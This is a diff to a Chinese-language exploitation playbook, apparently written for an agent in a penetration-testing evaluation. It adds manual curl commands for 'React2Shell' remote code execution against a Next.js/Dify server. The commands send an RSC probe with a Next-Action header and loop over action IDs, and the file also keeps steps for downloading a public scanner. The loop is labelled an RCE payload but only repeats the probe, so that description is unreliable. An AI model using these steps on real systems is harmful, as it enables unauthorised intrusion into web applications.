@@ -149,8 +149,33 @@ done
 
 **React2Shell 验证与利用**（当当前指纹支持且同主机没有更合适入口时）：
 
+**⚠️ 无外网环境 scanner.py 下载不了（SSL 失败/超时）**：评测环境通常无外网，
+`curl raw.githubusercontent.com` 会失败。改用下面的**手动 payload**（不依赖 scanner.py）。
+
 ```bash
-# 1. 下载官方 scanner
+# 手动 RSC payload（React2Shell 核心：Next-Action 指定 action + RSC 文本 payload）
+# 先探测（safe_check 替代）：发一个最小的 RSC 探针
+curl -s -i -X POST http://TARGET:3000/ \
+  -H 'Next-Action: x' \
+  -H 'Content-Type: text/plain;charset=UTF-8' \
+  -d '["$@1"]'
+# 观察响应：X-Action-Redirect / 307 / 500 代表 server action 被触发
+
+# RCE payload 结构（利用 RSC 的 thenable/函数引用注入）：
+# 核心是构造一个 RSC 行，引用某个可执行 Server Action 并传恶意参数。
+# 不同 Dify 版本 action id 不同，用数字 0/1/2/3 轮流试：
+for aid in 0 1 2 3 4 x; do
+  echo "=== aid=$aid ==="
+  curl -s -i -X POST http://TARGET:3000/ \
+    -H "Next-Action: $aid" \
+    -H 'Content-Type: text/plain;charset=UTF-8' \
+    -d '["$@1"]' \
+    -w "\nHTTP:%{http_code}\n"
+done
+```
+
+```bash
+# 1. 下载官方 scanner（仅有外网时）
 cd /tmp && mkdir -p c03 && cd c03
 curl -sL -o scanner.py "https://raw.githubusercontent.com/assetnote/react2shell-scanner/master/scanner.py"
 
